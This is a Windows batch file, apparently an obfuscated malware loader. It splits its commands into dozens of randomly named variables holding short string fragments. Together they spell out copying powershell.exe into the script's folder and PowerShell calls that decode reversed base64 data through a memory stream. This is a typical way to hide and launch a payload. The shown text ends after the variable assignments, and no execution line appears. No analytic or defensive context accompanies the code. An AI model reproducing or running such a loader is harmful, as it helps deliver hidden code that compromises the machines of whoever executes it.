@echo off
set "KQOKSuSvkS=do"
set "qGMlvfcFZT=y "
set "aJJqVPkSzA=Po"
set "unlNAGRiSZ=he"
set "rGfwCzlYbB=ll"
set "kPTMZfaaGn=ws"
set "zpAkYRIUpi=32"
set "vscbacneKg=po"
set "nClcCzFbxY=co"
set "yfIvTahxOc=he"
set "YbmTsRpKsg=ow"
set "GpaDKZLUXI=:\"
set "CnDpKZQrIF=rS"
set "tVnTOPADPD= C"
set "VVdnbJatkx=Wi"
set "LtlvxtAFhc=we"
set "OJeHKygpJU=in"
set "OoYQOySZRe=s\"
set "yzrBLHAesx=xe"
set "kopawvJOhU=\W"
set "NpkGNHxkHy=.e"
set "hpncgzjVzJ=py"
set "OhtsEjHaus=Sy"
set "mcQeRCrSiT=0\"
set "gOVStCENMi=rs"
set "ZxHaispsoN=nd"
set "UMRSdqPcIB=we"
set "ZTkTcFKPCw=1."
set "KtFjJTJjVj=st"
set "zGjJjzIzqU= /"
set "EvSELMguGV=\v"
set "tqadJKyQlK=em"
set "kZWKgQExpG=ll"
set "jyRYRFWRGd= %~dp0"
set "cgqjaqtfdU=cd"
set "sWRFuWUWFO=th('"
set "vvwPOCRHkR=Disp"
set "nQbnrndVRz=cN.I"
set "xboSiUvgxe=ZYYc"
set "IPFekfbsvZ==');"
set "YOZgCocnBN=[-1."
set "OqygzbErfo=pose"
set "JvBPFKziTc=Star"
set "eckjXQcUHe=oryS"
set "BYnTdVEGfJ=saH "
set "dTZnVqyyOr=0O+g"
set "lnBhZgCVHr=raph"
set "HTQmThBaUa=ne);"
set "FGiEXeLPto= = $"
set "tQSkeDNdut=join"
set "snPuEVFYWl=fY, "
set "wFCNvWryfu=.Dis"
set "ZGxyhwWFky=N.Pa"
set "tkuuQQYWOD=y]::"
set "RAolgaTHtB=CZsa"
set "RtWRwVlfCq=+hAO"
set "uBhHyGNeBT=;$Zv"
set "JJOeGIAJjp=pDZz"
set "aMntwTyVCu=ionM"
set "AckhiZljnA=ewLi"
set "SFggGNiRIi=gnir"
set "hHFtKbnWZE=eam("
set "DTRoxfKwta= = ["
set "RKhFNDdqlT=ert]"
set "YVRBTupbto=rtS4"
